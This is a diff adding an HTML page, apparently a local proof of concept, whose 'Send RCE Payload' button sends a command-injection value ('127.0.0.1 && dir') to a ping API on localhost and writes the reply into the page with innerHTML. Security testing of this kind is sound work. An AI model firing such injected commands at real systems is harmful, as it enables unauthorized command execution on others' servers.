@@ -1,0 +1,65 @@
+<html>
+    <head>
+        <style>
+            /* The base style shared with #output */
+            #output, .btn-style {
+                margin-top: 20px;
+                padding: 10px;
+                background-color: #f4f4f4;
+                border: 1px solid #ccc;
+                font-family: sans-serif; /* Clean font */
+            }
+
+            #output {
+                min-height: 50px;
+                white-space: pre-wrap;
+                overflow-x: auto;
+            }
+
+            .btn-style {
+                cursor: pointer;
+                transition: background 0.2s;
+                display: inline-block;
+                color: #333;
+                font-weight: bold;
+                text-transform: uppercase;
+                font-size: 12px;
+                letter-spacing: 1px;
+            }
+
+            .btn-style:hover {
+                background-color: #e8e8e8;
+                border-color: #bbb;
+            }
+
+            .btn-style:active {
+                background-color: #ddd;
+                transform: translateY(1px);
+            }
+        </style>
+    </head>
+    <body>
+        <button class="btn-style" onclick="Send()">Send RCE Payload</button>
+        
+        <div id="output">.</div>
+
+        <script>
+            const output = document.getElementById('output');
+        
+            async function Send() {
+                output.innerText = "Executing... please wait.";
+                
+                const host = "127.0.0.1 && dir";
+                const url = `https://127.0.0.1:3000/api/ping?host=${encodeURIComponent(host)}`;
+
+                try {
+                    const response = await fetch(url);
+                    const data = await response.text();
+                    output.innerHTML = data;
+                } catch (err) {
+                    output.innerText = "Error: " + err.message;
+                }
+            }
+        </script>
+    </body>
+</html>
